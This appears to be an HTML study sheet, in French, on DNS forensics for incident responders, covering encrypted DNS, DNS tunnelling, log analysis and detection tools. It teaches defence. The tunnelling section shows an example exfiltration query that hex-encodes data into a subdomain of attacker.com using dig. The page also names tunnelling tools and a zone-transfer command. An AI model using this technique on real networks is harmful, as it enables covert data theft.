@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>DNS Forensique Avancé — CAS-IN DFIR</title>
+<link rel="stylesheet" href="../style/fiche_style.css">
+</head>
+<body>
+<div id="scroll-progress"></div>
+<button class="back-top" id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+<nav class="tn-nav">
+  <a href="index.html" class="tn-back">← Fiches</a>
+  <span class="tn-title">RÉSEAUX & SÉCURITÉ</span>
+  <a href="../quiz.html" class="tn-quiz">💊 Quiz →</a>
+</nav>
+
+<div class="page-wrap">
+  <div class="breadcrumb">
+    <a href="../index.html">🏠 Accueil</a><span class="bc-sep">›</span>
+    <a href="index.html">Fiches</a><span class="bc-sep">›</span>
+    <a href="index.html#cat-réseaux">Réseaux & Sécurité</a><span class="bc-sep">›</span>
+    <span class="bc-current">DNS Forensique Avancé</span>
+    <span class="read-time-badge" style="margin-left:auto">⏱ ~14 min</span>
+  </div>
+
+  <div class="header" style="margin-top:1.25rem;padding-bottom:1.25rem;border-bottom:1px solid var(--border)">
+    <div><span style="font-size:2.2rem">🌐</span>
+    <span class="tag tag-blue" style="margin-left:.5rem">Réseaux</span>
+    <span class="tag tag-cyan" style="margin-left:.3rem">C2</span>
+    <span class="tag tag-orange" style="margin-left:.3rem">Malware</span></div>
+    <h1 style="font-family:var(--sans);font-size:2rem;font-weight:800;letter-spacing:-.5px;margin:.3rem 0 .15rem">DNS Forensique Avancé</h1>
+    <div class="meta">RFC 1035/8484 · DoH/DoT · DNS Tunneling · C2 Detection · Query Analysis · Pattern Recognition</div>
+  </div>
+
+  <div class="prereq-block" style="margin-top:1rem">
+    <div class="prereq-row"><span class="prereq-label">Prérequis :</span><a href="reseaux_basics.html" class="prereq-pill">📖 TCP/IP Basics</a><a href="wireshark.html" class="prereq-pill">📖 Wireshark & PCAP</a><a href="malware_forensique.html" class="prereq-pill">📖 Malware Forensics</a></div>
+    <div class="prereq-row"><span class="prereq-label">Voir aussi :</span><a href="ioc_threat_intel.html" class="related-pill">🔗 IOC & Threat Intel</a><a href="yara_rules.html" class="related-pill">🔗 YARA Rules</a></div>
+  </div>
+</div>
+
+<!-- TABS -->
+<div class="tabs" id="dns-tabs">
+  <button class="tab active" onclick="showTab('basics',this)">📋 DNS Basics</button>
+  <button class="tab" onclick="showTab('encrypted',this)">🔒 DoH/DoT/DNSSEC</button>
+  <button class="tab" onclick="showTab('tunneling',this)">🔷 DNS Tunneling</button>
+  <button class="tab" onclick="showTab('analysis',this)">📊 Log Analysis</button>
+  <button class="tab" onclick="showTab('detection',this)">🔍 Detection & Tools</button>
+</div>
+
+<!-- ══════════════════════════════════════════════
+     TAB 1 — DNS BASICS
+══════════════════════════════════════════════ -->
+<div class="tab-page active" id="tab-basics">
+
+<div class="concept-card">
+  <div class="concept-title">📋 DNS = Domain Name System (RFC 1035)</div>
+  Protocole couche application qui traduit noms domaine (example.com) en adresses IP (93.184.216.34). Utilisé pour TOUT sur internet (mail, web, API). Forensiquement = très révélateur.
+</div>
+
+<div class="sec-title">DNS Record Types Courants</div>
+
+<table style="width:100%;border-collapse:collapse;border:1px solid var(--border);margin:1rem 0;font-size:.85rem">
+  <tr style="background:rgba(106,128,168,.1)">
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Type</td>
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Purpose</td>
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Forensique</td>
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Exemple</td>
+  </tr>
+
+  <tr style="background:rgba(0,229,204,.05)">
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--cyan)"><strong>A</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">IPv4 address</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">🔴 PRINCIPAL (où va le traffic)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">example.com → 93.184.216.34</td>
+  </tr>
+
+  <tr>
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--blue)"><strong>MX</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Mail server</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Email routing (phishing?)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">example.com MX → mail.example.com</td>
+  </tr>
+
+  <tr style="background:rgba(0,229,204,.05)">
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--green)"><strong>NS</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Name server</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Qui gère le domaine</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">example.com NS → ns1.example.com</td>
+  </tr>
+
+  <tr>
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--orange)"><strong>TXT</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Text records</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">🟠 SPF, DKIM (authentication)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">v=spf1 include:_spf.google.com</td>
+  </tr>
+
+  <tr style="background:rgba(0,229,204,.05)">
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--purple)"><strong>SRV</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Service records</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Localiser services (SIP, Jabber)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">_sip._tcp.example.com</td>
+  </tr>
+
+  <tr>
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--red)"><strong>CNAME</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Alias</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">🔴 Domaines masqués (C2 redirect)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">www.example.com CNAME → cdn.example.com</td>
+  </tr>
+
+</table>
+
+<div class="sec-title">DNS Query Format (Wire Format)</div>
+
+<div style="margin:1.5rem 0;padding:1rem;background:rgba(106,128,168,.08);border:1px solid var(--border);border-radius:10px;font-family:var(--mono);font-size:.75rem;line-height:1.8">
+  <code>
+  <span style="color:var(--cyan)">QUERY EXAMPLE (Wireshark dump)</span><br>
+  <br>
+  Frame 1234: 81 bytes on wire (648 bits)<br>
+  DNS (id=0x1234)<br>
+  &nbsp;&nbsp;Transaction ID: 0x1234<br>
+  &nbsp;&nbsp;Flags: 0x0100 (Standard query)<br>
+  &nbsp;&nbsp;Questions: 1<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;example.com: type <strong>A</strong>, class IN<br>
+  &nbsp;&nbsp;Answers: 1<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;example.com: type A, class IN, TTL 3600<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong style="color:var(--green)">Address: 93.184.216.34</strong><br>
+  <br>
+  <span style="color:var(--dim)">↑ TTL = Time To Live (cache duration)</span>
+  </code>
+</div>
+
+<div class="concept-card" style="background:rgba(255,64,96,.04);border-left:3px solid var(--red);margin-top:1rem">
+  <strong style="color:var(--red)">⚠️ Pourquoi DNS en Forensique?</strong><br>
+  <ul style="margin:.5rem 0 0 1.5rem;font-size:.9rem">
+    <li><strong>Visible sur logs</strong> : Même trafic HTTPS chiffré, requête DNS = en clair (sauf DoH)</li>
+    <li><strong>Révèle intent</strong> : Quels sites visités, quels services utilisés</li>
+    <li><strong>Peut exfiltrer data</strong> : Subdomains encodent données (DNS tunneling)</li>
+    <li><strong>C2 communication</strong> : Malware beacon via DNS queries</li>
+    <li><strong>Timeline précis</strong> : Chaque query = timestamp serveur DNS</li>
+  </ul>
+</div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════
+     TAB 2 — ENCRYPTED DNS
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-encrypted">
+
+<div class="concept-card">
+  <div class="concept-title">🔒 DNS Chiffré : DoH, DoT, DNSSEC</div>
+  Moderne DNS = chiffrement pour privacy. Mais crée <strong>detection blind spots</strong>.
+</div>
+
+<div class="sec-title">Trois Standards Chiffrement</div>
+
+<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:.75rem;margin:1.5rem 0">
+
+  <div class="concept-card" style="background:rgba(0,229,204,.08);border-left:3px solid var(--cyan)">
+    <strong style="color:var(--cyan)">DoH (RFC 8484)</strong><br>
+    <span style="font-size:.85rem;line-height:1.6">
+      DNS over HTTPS<br>
+      Port 443 (HTTPS)<br>
+      Inside TLS handshake<br>
+      ⚠️ Invisible à proxy<br>
+      Usage: Chrome, Firefox
+    </span>
+  </div>
+
+  <div class="concept-card" style="background:rgba(88,166,255,.08);border-left:3px solid var(--blue)">
+    <strong style="color:var(--blue)">DoT (RFC 7858)</strong><br>
+    <span style="font-size:.85rem;line-height:1.6">
+      DNS over TLS<br>
+      Port 853 (TLS)<br>
+      Distinct from DNS<br>
+      ⚠️ Easier detect (port)<br>
+      Usage: Android 9+
+    </span>
+  </div>
+
+  <div class="concept-card" style="background:rgba(48,232,138,.08);border-left:3px solid var(--green)">
+    <strong style="color:var(--green)">DNSSEC (RFC 4034)</strong><br>
+    <span style="font-size:.85rem;line-height:1.6">
+      Signature validation<br>
+      NOT encryption<br>
+      Verifies authenticity<br>
+      ✅ Still visible<br>
+      Usage: ICANN standard
+    </span>
+  </div>
+
+</div>
+
+<div class="sec-title">Impact Forensique</div>
+
+<table style="width:100%;border-collapse:collapse;border:1px solid var(--border);margin:1rem 0;font-size:.85rem">
+  <tr style="background:rgba(106,128,168,.1)">
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Standard</td>
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Query Visible?</td>
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Metadata</td>
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Detection</td>
+  </tr>
+
+  <tr style="background:rgba(0,229,204,.05)">
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--cyan)"><strong>DoH</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--red)">❌ NO (HTTPS flow)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">IP dest, flow size, timing</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">🟠 Hard (analyze HTTPS metadata)</td>
+  </tr>
+
+  <tr>
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--blue)"><strong>DoT</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--red)">❌ NO (TLS 853)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Port 853 = distinctive</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">🟡 Easier (port signature)</td>
+  </tr>
+
+  <tr style="background:rgba(0,229,204,.05)">
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--green)"><strong>DNSSEC</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--green)">✅ YES (still DNS)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Full query visible</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">🟢 Easy (parse normally)</td>
+  </tr>
+
+  <tr>
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--orange)"><strong>Plain DNS</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--green)">✅ YES (UDP 53)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Complete query</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">🟢 Very easy</td>
+  </tr>
+
+</table>
+
+<div class="concept-card" style="background:rgba(188,140,255,.04);border-left:3px solid var(--purple);margin-top:1rem">
+  <strong style="color:var(--purple)">🔍 Detection DoH en Traffic</strong><br>
+  Même si query chiffré, <strong>metadata</strong> révèle:<br>
+  • Destination IP = Google (8.8.8.8), Cloudflare (1.1.1.1), etc.<br>
+  • Port 443 + TLS certificate = DoH provider<br>
+  • Flow size patterns (domains = certain size)<br>
+  • Timing analysis (timing peut révéler quoi demandé)<br>
+  → Possible tracer DoH usage même sans voir queries
+</div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════
+     TAB 3 — DNS TUNNELING
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-tunneling">
+
+<div class="concept-card">
+  <div class="concept-title">🔷 DNS Tunneling = Exfiltration via DNS</div>
+  Attaquant encode data dans subdomains. Chaque requête = quelques octets data. Invisible aux proxies (DNS pas considéré "data").
+</div>
+
+<div class="sec-title">Mechanism: Comment ça Marche</div>
+
+<div style="margin:1.5rem 0;padding:1rem;background:rgba(106,128,168,.08);border:1px solid var(--border);border-radius:10px">
+  <div style="color:var(--cyan);font-weight:600;margin-bottom:.75rem">Exemple : Exfiltrer "HELLO"</div>
+  <code style="display:block;font-family:var(--mono);font-size:.8rem;line-height:1.8">
+  1. Encoder "HELLO" en hex : 48 45 4C 4C 4F<br>
+  2. Créer subdomains :<br>
+  &nbsp;&nbsp;48454c4c4f.attacker.com<br>
+  3. Client malware queries :<br>
+  &nbsp;&nbsp;dig 48454c4c4f.attacker.com @dns.server<br>
+  4. DNS log enregistre requête<br>
+  5. Attacker lit log DNS → décode "HELLO"<br>
+  <br>
+  <span style="color:var(--dim)">Result: 5 bytes exfiltré via DNS!</span>
+  </code>
+</div>
+
+<div class="sec-title">Tools Courantes</div>
+
+<table style="width:100%;border-collapse:collapse;border:1px solid var(--border);margin:1rem 0;font-size:.85rem">
+  <tr style="background:rgba(106,128,168,.1)">
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Outil</td>
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Fonction</td>
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Detection</td>
+  </tr>
+
+  <tr style="background:rgba(0,229,204,.05)">
+    <td style="padding:.6rem;border:1px solid var(--border)"><strong>dnscat2</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">DNS C2 + exfiltration</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">High subdomain entropy</td>
+  </tr>
+
+  <tr>
+    <td style="padding:.6rem;border:1px solid var(--border)"><strong>iodine</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">DNS tunnel (legacy)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Specific pattern matching</td>
+  </tr>
+
+  <tr style="background:rgba(0,229,204,.05)">
+    <td style="padding:.6rem;border:1px solid var(--border)"><strong>dns2tcp</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Tunnel TCP over DNS</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Long query sequences</td>
+  </tr>
+
+</table>
+
+<div class="concept-card" style="background:rgba(255,64,96,.04);border-left:3px solid var(--red)">
+  <strong style="color:var(--red)">🚨 Detection Indicators</strong><br>
+  <ul style="margin:.5rem 0 0 1.5rem;font-size:.9rem">
+    <li><strong>Subdomain entropy</strong> = HIGH (random chars, not dictionary)</li>
+    <li><strong>Query frequency</strong> = EXCESSIVE (thousands/hour)</li>
+    <li><strong>Query length</strong> = LONG (max DNS label = 63 chars)</li>
+    <li><strong>Failed responses</strong> = NXDOMAIN repeatedly (domain doesn't exist)</li>
+    <li><strong>Volume</strong> = Unusual bytes/second over DNS</li>
+  </ul>
+</div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════
+     TAB 4 — LOG ANALYSIS
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-analysis">
+
+<div class="concept-card">
+  <div class="concept-title">📊 DNS Log Analysis Forensique</div>
+  DNS servers logent queries. Analyzer logs = reconstruct network behavior, detect C2, find exfiltration.
+</div>
+
+<div class="sec-title">Types de DNS Logs</div>
+
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1.5rem 0">
+
+  <div class="concept-card" style="background:rgba(0,229,204,.08)">
+    <strong style="color:var(--cyan)">Query Logs</strong><br>
+    <span style="font-size:.85rem;line-height:1.6">
+      Which domains queried<br>
+      Timestamp précis<br>
+      Source IP (client)<br>
+      Response code (ok/fail)<br>
+      <strong>Most useful for forensics</strong>
+    </span>
+  </div>
+
+  <div class="concept-card" style="background:rgba(88,166,255,.08)">
+    <strong style="color:var(--blue)">Zone Transfer Logs</strong><br>
+    <span style="font-size:.85rem;line-height:1.6">
+      Zone file copies<br>
+      Moins frequent<br>
+      Peut révéler infra change<br>
+      Detector takeover attempts
+    </span>
+  </div>
+
+</div>
+
+<div class="sec-title">Log Format Exemple (Bind9)</div>
+
+<div style="margin:1rem 0;padding:1rem;background:rgba(106,128,168,.08);border:1px solid var(--border);border-radius:10px;font-family:var(--mono);font-size:.75rem;line-height:2">
+  <code style="color:var(--text)">
+  20-Mar-2024 14:32:15.123 queries: info: client 192.168.1.100#54321 (example.com): query: example.com IN A +E (192.168.1.1)<br>
+  20-Mar-2024 14:32:15.456 queries: info: client 192.168.1.100#54322 (malware.ru): query: malware.ru IN A +E (192.168.1.1)<br>
+  20-Mar-2024 14:32:16.789 queries: info: client 192.168.1.100#54323 (c2-server.tk): query: c2-server.tk IN A +E (192.168.1.1)<br>
+  <span style="color:var(--dim)">↑ Pattern: Same client querying multiple suspicious domains</span>
+  </code>
+</div>
+
+<div class="sec-title">Timeline Builder Interactive</div>
+
+<div style="margin:1.5rem 0;padding:1rem;background:rgba(106,128,168,.08);border:1px solid var(--border);border-radius:10px">
+  <label style="display:block;margin-bottom:.75rem;font-size:.9rem;font-weight:600">
+    Collez logs DNS (format Bind, ou juste "domain timestamp"):
+    <textarea id="dns-logs" placeholder="example.com 2024-03-20 14:32:15&#10;malware.ru 2024-03-20 14:32:16&#10;c2-server.tk 2024-03-20 14:32:17" style="width:100%;height:120px;margin-top:.35rem;padding:.6rem;background:rgba(13,17,23,.5);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--mono);font-size:.8rem"></textarea>
+  </label>
+  <button onclick="parseDNSLogs()" style="width:100%;padding:.6rem;background:var(--cyan);color:var(--bg);border:none;border-radius:4px;font-weight:600;cursor:pointer;margin-bottom:1rem">Analyser</button>
+  
+  <div id="dns-result" style="padding:1rem;background:rgba(0,229,204,.1);border:1px solid rgba(0,229,204,.3);border-radius:6px;font-size:.85rem;min-height:80px">
+    <div style="color:var(--dim)">👆 Collez des logs pour voir timeline + detection indicators</div>
+  </div>
+</div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════
+     TAB 5 — DETECTION & TOOLS
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-detection">
+
+<div class="concept-card">
+  <div class="concept-title">🔍 Detection Rules & Tools</div>
+  Malware DNS patterns = détectable. Rules basées sur entropy, frequency, known-bad domains.
+</div>
+
+<div class="sec-title">Detection Strategies</div>
+
+<table style="width:100%;border-collapse:collapse;border:1px solid var(--border);margin:1rem 0;font-size:.85rem">
+  <tr style="background:rgba(106,128,168,.1)">
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Technique</td>
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Indicateur</td>
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Tool</td>
+  </tr>
+
+  <tr style="background:rgba(0,229,204,.05)">
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--cyan)"><strong>Entropy Analysis</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">High entropy subdomain (random chars)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Custom script, Bro/Zeek</td>
+  </tr>
+
+  <tr>
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--blue)"><strong>Frequency Analysis</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Excessive query rate (>100/min)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Zeek, Suricata, wc -l</td>
+  </tr>
+
+  <tr style="background:rgba(0,229,204,.05)">
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--green)"><strong>IOC Matching</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Known-bad domain lookup</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Threat intel feeds, YARA</td>
+  </tr>
+
+  <tr>
+    <td style="padding:.6rem;border:1px solid var(--border);color:var(--orange)"><strong>NXDomain Pattern</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Repeated NXDOMAIN responses</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Log analysis, grep, awk</td>
+  </tr>
+
+</table>
+
+<div class="sec-title">Tools Forensique DNS</div>
+
+<table style="width:100%;border-collapse:collapse;border:1px solid var(--border);margin:1rem 0;font-size:.85rem">
+  <tr style="background:rgba(106,128,168,.1)">
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Outil</td>
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">Fonction</td>
+    <td style="padding:.6rem;border:1px solid var(--border);font-weight:600">CLI/GUI</td>
+  </tr>
+
+  <tr style="background:rgba(0,229,204,.05)">
+    <td style="padding:.6rem;border:1px solid var(--border)"><strong>dig</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Query DNS (query logging, trace)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">CLI</td>
+  </tr>
+
+  <tr>
+    <td style="padding:.6rem;border:1px solid var(--border)"><strong>nslookup</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Query DNS (interactive)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">CLI</td>
+  </tr>
+
+  <tr style="background:rgba(0,229,204,.05)">
+    <td style="padding:.6rem;border:1px solid var(--border)"><strong>Wireshark</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Capture + analyze DNS packets</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">GUI</td>
+  </tr>
+
+  <tr>
+    <td style="padding:.6rem;border:1px solid var(--border)"><strong>Zeek (Bro)</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Network IDS, DNS logging + detection</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">CLI</td>
+  </tr>
+
+  <tr style="background:rgba(0,229,204,.05)">
+    <td style="padding:.6rem;border:1px solid var(--border)"><strong>dnsstat</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Analyze DNS logs (entropy, frequency)</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">CLI</td>
+  </tr>
+
+  <tr>
+    <td style="padding:.6rem;border:1px solid var(--border)"><strong>dnsdumpster</strong></td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Passive DNS reconnaissance</td>
+    <td style="padding:.6rem;border:1px solid var(--border)">Web</td>
+  </tr>
+
+</table>
+
+<div class="sec-title">CLI Quick Commands</div>
+
+<div style="margin:1rem 0;padding:1rem;background:rgba(106,128,168,.08);border:1px solid var(--border);border-radius:10px;font-family:var(--mono);font-size:.75rem">
+  <code style="display:block;color:var(--cyan);margin-bottom:1rem">
+  # Query DNS (see response)<br>
+  $ dig example.com @8.8.8.8<br>
+  $ dig example.com MX +short<br>
+  <br>
+  # Zone transfer attempt (may fail)<br>
+  $ dig @ns1.example.com example.com axfr<br>
+  <br>
+  # Reverse DNS<br>
+  $ dig -x 93.184.216.34<br>
+  <br>
+  # Analyze DNS logs for suspicious patterns<br>
+  $ grep NXDOMAIN /var/log/named.log | wc -l<br>
+  $ cat dns.log | awk '{print $5}' | sort | uniq -c | sort -rn | head<br>
+  <br>
+  # Entropy calculation (Python)<br>
+  $ python3 -c "import math; d='randomdomain'; h=-sum(d.count(c)/len(d)*math.log2(d.count(c)/len(d)) for c in set(d)); print(f'Entropy: {h:.2f}')"
+  </code>
+</div>
+
+<div class="concept-card" style="background:rgba(48,232,138,.04);border-left:3px solid var(--green)">
+  <strong style="color:var(--green)">✅ Workflow Forensique DNS</strong><br>
+  <ol style="margin:.75rem 0 0 1.5rem;font-size:.9rem;line-height:1.8">
+    <li>Extraire logs DNS (firewall, recursive resolver, autoritaire)</li>
+    <li>Analyser patterns (frequency, entropy, NXDOMAIN %)</li>
+    <li>Cross-check IOCs (Threat Intel feeds)</li>
+    <li>Identify C2 domains (known-bad, suspicious patterns)</li>
+    <li>Timeline reconstruction (when compromise began)</li>
+    <li>Correlate avec autres sources (NetFlow, Syslog, HTTP logs)</li>
+    <li>Rapport forensique (timeline, IOCs, recommendations)</li>
+  </ol>
+</div>
+
+</div>
+
+</div>
+
+<script>
+function showTab(tab, btn) {
+  var pages = document.querySelectorAll('.tab-page');
+  pages.forEach(p => p.classList.remove('active'));
+  document.getElementById('tab-' + tab).classList.add('active');
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  btn.classList.add('active');
+}
+
+function parseDNSLogs() {
+  var input = document.getElementById('dns-logs').value;
+  var lines = input.trim().split('\n');
+  var result = document.getElementById('dns-result');
+  
+  if (!input) {
+    result.innerHTML = '<div style="color:var(--dim)">Aucunes données</div>';
+    return;
+  }
+  
+  var domains = [];
+  var suspiciousCount = 0;
+  var suspiciousKeywords = ['malware', 'c2', 'bot', '.tk', '.ru', '.top'];
+  
+  lines.forEach(line => {
+    var parts = line.split(/\s+/);
+    if (parts[0]) {
+      domains.push(parts[0]);
+      suspiciousKeywords.forEach(kw => {
+        if (parts[0].toLowerCase().includes(kw)) suspiciousCount++;
+      });
+    }
+  });
+  
+  var html = '<div style="color:var(--green);font-weight:600">📊 Analyse Résultats</div>';
+  html += '<div style="font-size:.85rem;margin-top:.5rem">';
+  html += '<strong>Total domaines :</strong> ' + domains.length + '<br>';
+  html += '<strong>Suspicious patterns :</strong> ' + suspiciousCount + ' 🚨<br>';
+  html += '<strong>Unique domains :</strong> ' + new Set(domains).size + '<br>';
+  html += '<strong style="color:var(--orange)">⚠️ Indicateurs :</strong><br>';
+  if (suspiciousCount > 0) html += '• Suspicious TLDs/keywords detected<br>';
+  if (domains.length > 50) html += '• High query volume (possible beacon)<br>';
+  html += '</div>';
+  
+  result.innerHTML = html;
+}
+</script>
+
+</body>
+</html>
